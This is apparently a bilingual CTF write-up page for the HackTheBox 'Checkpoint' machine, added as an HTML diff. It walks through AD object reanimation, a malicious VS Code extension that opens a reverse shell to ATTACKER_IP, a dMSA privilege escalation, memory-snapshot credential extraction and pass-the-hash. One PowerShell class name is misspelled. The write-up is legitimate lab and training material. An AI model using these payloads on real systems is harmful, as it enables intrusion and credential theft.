@@ -1,0 +1,306 @@
+<html lang="es">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Checkpoint Writeup | Brian | Cybersecurity</title>
+    <link rel="icon" type="image/png" href="/avatar.png" />
+    
+    <style>
+      body {
+        margin: 0; padding: 0;
+        background-color: #000000; color: #e2e8f0;
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      }
+      header {
+        display: flex; justify-content: space-between; align-items: center;
+        padding: 1rem 2rem; background-color: #09090b;
+        border-bottom: 1px solid #27272a; position: sticky; top: 0; z-index: 100;
+      }
+      .logo-container { display: flex; align-items: center; gap: 12px; }
+      .avatar {
+        width: 42px; height: 42px; border-radius: 50%;
+        background: #18181b; border: 2px solid #facc15;
+        box-shadow: 0 0 10px rgba(250, 204, 21, 0.4);
+        overflow: hidden; display: flex; align-items: center; justify-content: center;
+      }
+      .avatar img { width: 42px; height: 42px; object-fit: cover; }
+      .logo-text { color: #facc15; font-weight: 700; font-size: 1.1rem; text-decoration: none; }
+      
+      .lang-btn {
+        background: transparent; border: 1px solid #facc15; color: #facc15;
+        padding: 0.3rem 0.8rem; border-radius: 4px; cursor: pointer;
+        font-weight: 600; font-size: 0.85rem; transition: all 0.2s;
+      }
+      .lang-btn:hover { background-color: #facc15; color: #000000; }
+
+      main { max-width: 900px; margin: 3rem auto; padding: 0 1.5rem; }
+      h1, h2, h3 { color: #facc15; }
+      h1 { font-size: 2rem; border-bottom: 1px solid #27272a; padding-bottom: 0.5rem; }
+      h2 { font-size: 1.4rem; margin-top: 2.5rem; border-bottom: 1px solid #27272a; padding-bottom: 0.3rem; }
+      h3 { font-size: 1.1rem; margin-top: 1.5rem; }
+      p, li { color: #a1a1aa; line-height: 1.6; }
+      .img-container {
+        margin: 1.5rem 0;
+        text-align: center;
+      }
+      .img-container img {
+        max-width: 100%;
+        height: auto;
+        border: 1px solid #27272a;
+        border-radius: 6px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+      }
+      pre {
+        background-color: #09090b; border: 1px solid #27272a;
+        padding: 1rem; border-radius: 6px; overflow-x: auto;
+        color: #f8fafc; font-family: 'Courier New', Courier, monospace;
+        font-size: 0.85rem;
+      }
+      code { color: #facc15; font-family: 'Courier New', Courier, monospace; }
+      pre code { color: #e2e8f0; }
+
+      .back-btn {
+        display: inline-block; color: #000000; background-color: #facc15;
+        padding: 0.5rem 1rem; border-radius: 6px; font-weight: 600;
+        text-decoration: none; margin-bottom: 2rem; transition: background 0.2s;
+      }
+      .back-btn:hover { background-color: #fde047; }
+    </style>
+  </head>
+  <body>
+
+    <header>
+      <div class="logo-container">
+        <div class="avatar">
+          <img src="/avatar.png" alt="Brian Català Avatar" />
+        </div>
+        <a href="/" class="logo-text">brian-catala.github.io</a>
+      </div>
+      <button id="lang-toggle" class="lang-btn">EN / ES</button>
+    </header>
+
+    <main>
+      <a href="/" class="back-btn" data-en="← Back to home" data-es="← Volver al inicio">← Volver al inicio</a>
+
+      <h1 data-en="Write-up: Checkpoint (HackTheBox)" data-es="Write-up: Checkpoint (HackTheBox)">Write-up: Checkpoint (HackTheBox)</h1>
+      <p>
+        <strong data-en="Difficulty:" data-es="Dificultad:">Dificultad:</strong>
+        <span data-en="Medium" data-es="Media">Media</span> |
+        <strong data-en="Platform:" data-es="Plataforma:">Plataforma:</strong> HackTheBox
+      </p>
+      <p>
+        <strong data-en="Objectives:" data-es="Objetivos:">Objetivos:</strong>
+        <span data-en="AD Recycle Bin tombstone reanimation, VS Code extension supply chain attack, dMSA privilege escalation (BetterSuccessor), and credential extraction from a VMware memory snapshot."
+              data-es="Reanimación de objetos eliminados en la Papelera de reciclaje de AD, supply chain attack mediante extensión de VS Code, escalada de privilegios con dMSA (BetterSuccessor) y extracción de credenciales desde un snapshot de memoria de VMware.">
+          Reanimación de objetos eliminados en la Papelera de reciclaje de AD, supply chain attack mediante extensión de VS Code, escalada de privilegios con dMSA (BetterSuccessor) y extracción de credenciales desde un snapshot de memoria de VMware.
+        </span>
+      </p>
+
+      <!-- ===================== 1. RECONOCIMIENTO ===================== -->
+      <h2 data-en="1. Initial Reconnaissance (Nmap)" data-es="1. Reconocimiento Inicial (Nmap)">1. Reconocimiento Inicial (Nmap)</h2>
+      <p data-en="We begin by discovering all open ports on the target machine:"
+         data-es="Comenzamos descubriendo todos los puertos abiertos en la máquina objetivo:">
+        Comenzamos descubriendo todos los puertos abiertos en la máquina objetivo:
+      </p>
+      <pre><code>ports=$(nmap -p- --min-rate=10000 -T4 -Pn 10.129.85.252 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -sC -sV -Pn 10.129.85.252</code></pre>
+      <p data-en="The combination of DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), WinRM (5985), and ADWS (9389) is the classic fingerprint of a Domain Controller. The scan identifies the host as DC01 and the domain as checkpoint.htb."
+         data-es="La combinación de DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), WinRM (5985) y ADWS (9389) es la huella característica de un Controlador de Dominio. El escaneo identifica el host como DC01 y el dominio como checkpoint.htb.">
+        La combinación de DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), WinRM (5985) y ADWS (9389) es la huella característica de un Controlador de Dominio. El escaneo identifica el host como DC01 y el dominio como checkpoint.htb.
+      </p>
+      <pre><code>echo "10.129.85.252 checkpoint.htb dc01.checkpoint.htb DC01" | sudo tee -a /etc/hosts</code></pre>
+
+      <!-- ===================== 2. ENUMERACIÓN SMB ===================== -->
+      <h2 data-en="2. SMB Enumeration" data-es="2. Enumeración SMB">2. Enumeración SMB</h2>
+      <p data-en="This machine follows an assumed breach scenario, so we start with a set of low-privileged domain credentials. The first step is to enumerate accessible shares:"
+         data-es="Esta máquina sigue un escenario de assumed breach, por lo que partimos de credenciales de dominio con bajos privilegios. El primer paso es enumerar los recursos compartidos accesibles:">
+        Esta máquina sigue un escenario de assumed breach, por lo que partimos de credenciales de dominio con bajos privilegios. El primer paso es enumerar los recursos compartidos accesibles:
+      </p>
+      <pre><code>netexec smb checkpoint.htb -u alex.turner -p 'REDACTED' --shares</code></pre>
+      <p data-en="Two non-standard shares stand out: DevDrop (readable), described as a drop zone for approved .vsix VS Code extensions pinned to engine 1.118.0, and VMBackups, visible but with no permissions at all."
+         data-es="Destacan dos recursos no estándar: DevDrop (lectura), descrito como zona de entrega para extensiones .vsix de VS Code aprobadas con engine 1.118.0, y VMBackups, visible pero sin permisos de acceso.">
+        Destacan dos recursos no estándar: <code>DevDrop</code> (lectura), descrito como zona de entrega para extensiones <code>.vsix</code> de VS Code con engine 1.118.0, y <code>VMBackups</code>, visible pero sin permisos de acceso.
+      </p>
+
+      <!-- ===================== 3. AD RECYCLE BIN ===================== -->
+      <h2 data-en="3. AD Recycle Bin: Tombstone Reanimation" data-es="3. Papelera de Reciclaje de AD: Reanimación de Tombstone">3. Papelera de Reciclaje de AD: Reanimación de Tombstone</h2>
+      <p data-en="Using bloodyAD we map all directory objects writable by our user. Several targets belong to CN=Deleted Objects, the container backing the AD Recycle Bin, including a deleted contractor account (mark.davies) whose last known parent is the Employees OU, where we hold CreateChild."
+         data-es="Usando bloodyAD mapeamos todos los objetos del directorio sobre los que nuestro usuario tiene permisos de escritura. Varios objetivos pertenecen a CN=Deleted Objects, el contenedor de la Papelera de reciclaje de AD, incluyendo una cuenta eliminada (mark.davies) cuyo último contenedor conocido es la OU Employees, donde tenemos CreateChild.">
+        Usando <code>bloodyAD</code> mapeamos todos los objetos del directorio sobre los que nuestro usuario tiene permisos de escritura. Varios objetivos pertenecen a <code>CN=Deleted Objects</code>, incluyendo una cuenta eliminada (<code>mark.davies</code>) cuyo último contenedor conocido es la OU <code>Employees</code>, donde tenemos <code>CreateChild</code>.
+      </p>
+      <pre><code>bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'REDACTED' get writable</code></pre>
+      <p data-en="Deleted objects are hidden from ordinary LDAP searches. We enumerate them using the Show Deleted Objects control (OID 1.2.840.113556.1.4.417):"
+         data-es="Los objetos eliminados están ocultos en búsquedas LDAP normales. Los enumeramos con el control Show Deleted Objects (OID 1.2.840.113556.1.4.417):">
+        Los objetos eliminados están ocultos en búsquedas LDAP normales. Los enumeramos con el control Show Deleted Objects (OID 1.2.840.113556.1.4.417):
+      </p>
+      <pre><code>bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'REDACTED' \
+  get search --base 'CN=Deleted Objects,DC=checkpoint,DC=htb' \
+  --filter '(isDeleted=TRUE)' \
+  --attr sAMAccountName,lastKnownParent,msDS-LastKnownRDN \
+  -c 1.2.840.113556.1.4.417 -c 1.2.840.113556.1.4.2065</code></pre>
+      <p data-en="With write access over the deleted object and CreateChild on the target OU, we reanimate the account:"
+         data-es="Con escritura sobre el objeto eliminado y CreateChild en la OU de destino, reanimamos la cuenta:">
+        Con escritura sobre el objeto eliminado y <code>CreateChild</code> en la OU de destino, reanimamos la cuenta:
+      </p>
+      <pre><code>bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'REDACTED' \
+  set restore 'mark.davies'</code></pre>
+
+      <!-- ===================== 4. SUPPLY CHAIN VSIX ===================== -->
+      <h2 data-en="4. Foothold: VS Code Extension Supply Chain Attack" data-es="4. Acceso Inicial: Supply Chain Attack con Extensión de VS Code">4. Acceso Inicial: Supply Chain Attack con Extensión de VS Code</h2>
+      <p data-en="The restored account reuses its previous password, and with it we gain write access to DevDrop. A VS Code extension is simply a .vsix archive (ZIP) containing a manifest and plain JavaScript that the editor executes in-process with no sandboxing. A share that collects extensions for installation is a textbook supply chain weakness."
+         data-es="La cuenta restaurada reutiliza su contraseña anterior, y con ella obtenemos acceso de escritura sobre DevDrop. Una extensión de VS Code es simplemente un archivo .vsix (ZIP) con un manifiesto y JavaScript plano que el editor ejecuta en su propio proceso sin ningún sandbox. Un recurso compartido que recoge extensiones para instalarlas automáticamente es un vector de supply chain clásico.">
+        La cuenta restaurada reutiliza su contraseña anterior, y con ella obtenemos acceso de escritura sobre <code>DevDrop</code>. Una extensión de VS Code es simplemente un archivo <code>.vsix</code> (ZIP) con un manifiesto y JavaScript plano que el editor ejecuta en su propio proceso sin ningún sandbox.
+      </p>
+
+      <h3 data-en="Extension structure" data-es="Estructura de la extensión">Estructura de la extensión</h3>
+      <pre><code>beautify/
+├── [Content_Types].xml      # OPC MIME-type map
+├── extension.vsixmanifest   # VSIX package manifest
+└── extension/
+    ├── package.json         # extension manifest (VS Code)
+    └── extension.js         # payload</code></pre>
+      <p data-en="The activation event onStartupFinished fires as soon as the editor finishes loading, with no user interaction needed. The payload opens a TCP socket, spawns cmd.exe, and pipes stdio over it:"
+         data-es="El evento de activación onStartupFinished se dispara en cuanto el editor termina de cargar, sin necesidad de interacción del usuario. El payload abre un socket TCP, lanza cmd.exe y enruta la entrada/salida sobre él:">
+        El evento de activación <code>onStartupFinished</code> se dispara en cuanto el editor termina de cargar, sin interacción del usuario. El payload abre un socket TCP, lanza <code>cmd.exe</code> y enruta la entrada/salida sobre él:
+      </p>
+      <pre><code>// extension.js (fragmento)
+const net = require("net");
+const cp  = require("child_process");
+
+function activate(context) {
+  const client = new net.Socket();
+  const sh = cp.spawn("cmd.exe", []);
+  client.connect(9090, "ATTACKER_IP", function () {
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+  });
+  client.on("error", () => setTimeout(() => activate(context), 5000));
+}
+module.exports = { activate, deactivate: () => {} };</code></pre>
+      <p data-en="We package the extension and drop it into the share while a Netcat listener waits on port 9090. A scheduled task on the host installs and launches the extension, returning a shell as the developer user ryan.brooks:"
+         data-es="Empaquetamos la extensión y la subimos al share mientras un listener Netcat espera en el puerto 9090. Una tarea programada en el host instala y lanza la extensión, devolviendo una shell como el usuario desarrollador ryan.brooks:">
+        Empaquetamos la extensión y la subimos al share mientras un listener Netcat espera en el puerto 9090. Una tarea programada en el host instala y lanza la extensión, devolviendo una shell como el usuario <code>ryan.brooks</code>:
+      </p>
+      <pre><code>zip -r beautify.vsix '[Content_Types].xml' extension.vsixmanifest extension/
+nc -lvnp 9090
+smbclient //checkpoint.htb/DevDrop -U 'checkpoint.htb/mark.davies%REDACTED' \
+  -c 'put beautify.vsix beautify.vsix'</code></pre>
+
+      <!-- ===================== 5. BETTERSUCCESSOR ===================== -->
+      <h2 data-en="5. Lateral Movement: BetterSuccessor (dMSA Privilege Escalation)" data-es="5. Movimiento Lateral: BetterSuccessor (Escalada con dMSA)">5. Movimiento Lateral: BetterSuccessor (Escalada con dMSA)</h2>
+      <p data-en="With the shell as ryan.brooks, we enumerate our AD permissions and find two key rights: CreateChild over the DMSAHolder OU, and GenericWrite over the service account svc_deploy."
+         data-es="Con la shell como ryan.brooks, enumeramos nuestros permisos en AD y encontramos dos derechos clave: CreateChild sobre la OU DMSAHolder y GenericWrite sobre la cuenta de servicio svc_deploy.">
+        Con la shell como <code>ryan.brooks</code>, enumeramos nuestros permisos en AD y encontramos dos derechos clave: <code>CreateChild</code> sobre la OU <code>DMSAHolder</code> y <code>GenericWrite</code> sobre la cuenta de servicio <code>svc_deploy</code>.
+      </p>
+      <pre><code>Import-Module ActiveDirectory
+$acl = Get-Acl "AD:\OU=DMSAHolder,DC=checkpoint,DC=htb"
+$acl.Access | Where-Object {$_.IdentityReference -like "*ryan*"} | Select IdentityReference,ActiveDirectoryRights
+
+$acl2 = Get-Acl "AD:\CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
+$acl2.Access | Where-Object {$_.IdentityReference -like "*ryan*"} | Select IdentityReference,ActiveDirectoryRights</code></pre>
+
+      <h3 data-en="About the BetterSuccessor technique" data-es="Sobre la técnica BetterSuccessor">Sobre la técnica BetterSuccessor</h3>
+      <p data-en="Windows Server 2025 introduced Delegated Managed Service Accounts (dMSA). The original BadSuccessor attack allowed anyone with CreateChild over an OU to point a dMSA's msDS-ManagedAccountPrecededByLink attribute at any privileged account and receive a Kerberos ticket carrying that account's privileges. Microsoft patched this in August 2025 by requiring a mutual link: the predecessor must also reference the dMSA via msDS-SupersededManagedAccountLink. BetterSuccessor is the post-patch variant: if the attacker also holds write access over the predecessor account, they can set the reverse link themselves, satisfying the KDC validation."
+         data-es="Windows Server 2025 introdujo las Delegated Managed Service Accounts (dMSA). El ataque original BadSuccessor permitía a cualquiera con CreateChild sobre una OU apuntar el atributo msDS-ManagedAccountPrecededByLink de un dMSA hacia cualquier cuenta privilegiada y recibir un ticket Kerberos con sus privilegios. Microsoft lo parcheó en agosto de 2025 exigiendo un enlace mutuo: la cuenta predecesora también debe referenciar al dMSA mediante msDS-SupersededManagedAccountLink. BetterSuccessor es la variante post-parche: si el atacante también tiene escritura sobre la cuenta predecesora, puede establecer él mismo el enlace inverso, satisfaciendo la validación del KDC.">
+        Windows Server 2025 introdujo las <strong>Delegated Managed Service Accounts (dMSA)</strong>. El ataque original <em>BadSuccessor</em> permitía a cualquiera con <code>CreateChild</code> sobre una OU apuntar el atributo <code>msDS-ManagedAccountPrecededByLink</code> de un dMSA hacia cualquier cuenta privilegiada y recibir un ticket Kerberos con sus privilegios. Microsoft lo parcheó en agosto de 2025 exigiendo un enlace mutuo. <strong>BetterSuccessor</strong> es la variante post-parche: si el atacante también tiene escritura sobre la cuenta predecesora, puede establecer él mismo el enlace inverso, satisfaciendo la validación del KDC.
+      </p>
+
+      <h3 data-en="Creating and weaponizing the dMSA" data-es="Creación y armado del dMSA">Creación y armado del dMSA</h3>
+      <pre><code>.\SharpSuccessor.exe add /impersonate:svc_deploy /path:"OU=DMSAHolder,DC=checkpoint,DC=htb" /account:ryan.brooks /name:svc_backup</code></pre>
+      <p data-en="Because Set-ADObject and System.DirectoryServices do not reliably persist these attributes, we use a raw LDAP ModifyRequest via System.DirectoryServices.Protocols to write the mutual link on svc_deploy:"
+         data-es="Como Set-ADObject y System.DirectoryServices no persisten estos atributos de forma fiable, usamos una ModifyRequest LDAP cruda con System.DirectoryServices.Protocols para escribir el enlace mutuo en svc_deploy:">
+        Como <code>Set-ADObject</code> y <code>System.DirectoryServices</code> no persisten estos atributos de forma fiable, usamos una <code>ModifyRequest</code> LDAP cruda con <code>System.DirectoryServices.Protocols</code> para escribir el enlace mutuo en <code>svc_deploy</code>:
+      </p>
+      <pre><code>Add-Type -AssemblyName "System.DirectoryServices.Protocols"
+$ldap = New-Object System.DirectoryServices.Protocols.LdapConnection("DC01.checkpoint.htb")
+$ldap.AuthType = "Negotiate"; $ldap.Bind()
+
+$dmsa   = "CN=svc_backup,OU=DMSAHolder,DC=checkpoint,DC=htb"
+$target = "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
+$mod    = New-Object System.DirectoryServices.Protocols.ModifyRequest
+$mod.DistinguishedName = $target
+
+$m1 = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
+$m1.Name = "msDS-SupersededManagedAccountLink"; $m1.Operation = "Replace"; $null = $m1.Add($dmsa)
+
+$m2 = New-Object System.DirecticsoryServices.Protocols.DirectoryAttributeModification
+$m2.Name = "msDS-SupersededServiceAccountState"; $m2.Operation = "Replace"; $null = $m2.Add("2")
+
+$null = $mod.Modifications.Add($m1); $null = $mod.Modifications.Add($m2)
+$ldap.SendRequest($mod).ResultCode</code></pre>
+      <p data-en="With the mutual pairing in place, we request a delegated TGT for the current session and then ask for a TGS for the dMSA:"
+         data-es="Con el emparejamiento mutuo establecido, pedimos un TGT delegado para la sesión actual y luego solicitamos un TGS para el dMSA:">
+        Con el emparejamiento mutuo establecido, pedimos un TGT delegado para la sesión actual y luego solicitamos un TGS para el dMSA:
+      </p>
+      <pre><code>.\Rubeus.exe tgtdeleg /nowrap
+.\Rubeus.exe asktgs /targetuser:svc_backup$ /service:krbtgt/CHECKPOINT.HTB /opsec /dmsa /nowrap /ticket:&lt;TGT_ryan_brooks&gt;</code></pre>
+      <p data-en="The resulting ticket carries the group memberships of svc_deploy. We convert it and open a WinRM session as the dMSA:"
+         data-es="El ticket resultante lleva los grupos de pertenencia de svc_deploy. Lo convertimos y abrimos una sesión WinRM como el dMSA:">
+        El ticket resultante lleva los grupos de pertenencia de <code>svc_deploy</code>. Lo convertimos y abrimos una sesión WinRM como el dMSA:
+      </p>
+      <pre><code>echo '&lt;BASE64_TICKET&gt;' | base64 -d > svc_backup.kirbi
+impacket-ticketConverter svc_backup.kirbi svc_backup.ccache
+export KRB5CCNAME=$(pwd)/svc_backup.ccache
+sudo ntpdate dc01.checkpoint.htb
+evil-winrm -i DC01.checkpoint.htb -r CHECKPOINT.HTB</code></pre>
+
+      <!-- ===================== 6. VMWARE SNAPSHOT ===================== -->
+      <h2 data-en="6. Privilege Escalation: Credential Extraction from VMware Snapshot" data-es="6. Escalada de Privilegios: Extracción de Credenciales desde Snapshot de VMware">6. Escalada de Privilegios: Extracción de Credenciales desde Snapshot de VMware</h2>
+      <p data-en="With the svc_deploy context, we can now read the VMBackups share. It contains a VMware snapshot (.vmem + .vmsn) of a decommissioned Windows Server 2019, taken while the VM was powered on. This is a complete offline copy of the guest's RAM, including LSASS cached credentials. Hardening measures like PPL and Credential Guard offer nothing here — we are reading a file, not querying a live process."
+         data-es="Con el contexto de svc_deploy, podemos leer el share VMBackups. Contiene un snapshot de VMware (.vmem + .vmsn) de un Windows Server 2019 descomisionado, tomado con la VM encendida. Esto equivale a una copia completa de la RAM del guest, incluyendo las credenciales cacheadas de LSASS. Las protecciones como PPL y Credential Guard no sirven de nada aquí: estamos leyendo un archivo, no consultando un proceso vivo.">
+        Con el contexto de <code>svc_deploy</code>, podemos leer el share <code>VMBackups</code>. Contiene un snapshot de VMware (<code>.vmem</code> + <code>.vmsn</code>) de un Windows Server 2019 descomisionado, tomado con la VM encendida. Esto equivale a una copia completa de la RAM del guest, incluyendo las credenciales cacheadas de LSASS. Las protecciones como PPL o Credential Guard no sirven aquí: se está leyendo un archivo, no un proceso vivo.
+      </p>
+      <pre><code>upload vmkatz.exe
+.\vmkatz.exe 'C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmsn'</code></pre>
+      <p data-en="The tool extracts the NT hash of the local Administrator of the retired server. Given the password reuse pattern already observed in this environment, we test it against the Domain Controller with Pass-the-Hash:"
+         data-es="La herramienta extrae el hash NT del Administrador local del servidor retirado. Dado el patrón de reutilización de contraseñas ya observado en el entorno, lo probamos contra el Controlador de Dominio con Pass-the-Hash:">
+        La herramienta extrae el hash NT del Administrador local del servidor retirado. Dado el patrón de reutilización de contraseñas ya observado en el entorno, lo probamos contra el Controlador de Dominio con Pass-the-Hash:
+      </p>
+      <pre><code>netexec smb checkpoint.htb -u Administrator -H &lt;HASH_REDACTED&gt;
+evil-winrm -i DC01.checkpoint.htb -u Administrator -H &lt;HASH_REDACTED&gt;</code></pre>
+      <p data-en="The hash is valid against the Domain Controller. Domain fully compromised."
+         data-es="El hash es válido contra el Controlador de Dominio. ¡Dominio completamente comprometido.">
+        El hash es válido contra el Controlador de Dominio. ¡Dominio completamente comprometido!
+      </p>
+
+      <!-- ===================== RESUMEN ===================== -->
+      <h2 data-en="Summary of techniques" data-es="Resumen de técnicas">Resumen de técnicas</h2>
+      <ul>
+        <li data-en="AD Recycle Bin abuse to reanimate tombstoned objects" data-es="Abuso de la Papelera de reciclaje de AD para reanimar objetos eliminados">Abuso de la Papelera de reciclaje de AD para reanimar objetos eliminados</li>
+        <li data-en="Supply chain attack via VS Code extension (.vsix)" data-es="Supply chain attack mediante extensión de VS Code (.vsix)">Supply chain attack mediante extensión de VS Code (<code>.vsix</code>)</li>
+        <li data-en="dMSA privilege escalation — BetterSuccessor (post-patch BadSuccessor variant)" data-es="Escalada de privilegios con dMSA — BetterSuccessor (variante post-parche de BadSuccessor)">Escalada de privilegios con dMSA — BetterSuccessor (variante post-parche de BadSuccessor)</li>
+        <li data-en="Credential extraction from a live VMware memory snapshot" data-es="Extracción de credenciales desde un snapshot de memoria de VMware en caliente">Extracción de credenciales desde un snapshot de memoria de VMware en caliente</li>
+        <li data-en="Pass-the-Hash to Domain Admin" data-es="Pass-the-Hash para acceder como Domain Admin">Pass-the-Hash para acceder como Domain Admin</li>
+      </ul>
+
+      <a href="/" class="back-btn" style="margin-top: 3rem;" data-en="← Back to home" data-es="← Volver al inicio">← Volver al inicio</a>
+    </main>
+
+    <script>
+      const langToggle = document.getElementById('lang-toggle');
+      let currentLang = localStorage.getItem('site-lang') || 'es';
+
+      function setLanguage(lang) {
+        currentLang = lang;
+        localStorage.setItem('site-lang', lang);
+        document.documentElement.lang = lang;
+
+        document.querySelectorAll('[data-en]').forEach(el => {
+          if (lang === 'en') {
+            el.innerHTML = el.getAttribute('data-en');
+          } else {
+            el.innerHTML = el.getAttribute('data-es');
+          }
+        });
+        langToggle.textContent = lang === 'en' ? 'ES' : 'EN';
+      }
+
+      setLanguage(currentLang);
+
+      langToggle.addEventListener('click', () => {
+        setLanguage(currentLang === 'en' ? 'es' : 'en');
+      });
+    </script>
+  </body>
+</html>
